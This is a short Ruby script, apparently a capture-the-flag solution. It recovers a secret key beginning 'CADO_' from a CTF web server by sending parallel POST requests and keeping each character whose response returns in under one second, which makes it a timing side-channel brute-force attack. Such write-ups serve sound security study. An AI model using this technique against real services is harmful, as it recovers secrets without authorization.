gem "ezclient"
gem "parallel"

require "ezclient"
require "parallel"

CHARS = "!".."~"
URL = "http://web2.cadoctf.cloud:1332/"

prefix = "CADO_"
client = EzClient.new

loop do
  size = prefix.size

  Parallel.each(CHARS, in_threads: 8) do |char|
    next if prefix.size > size
    key = prefix + char
    request = client.request(:post, URL, params: { key: })
    resp = request.perform!
    print "#{key} #{request.elapsed_seconds}\n"
    prefix << char if request.elapsed_seconds < 1
  end

  break if prefix.size == size
end

puts prefix
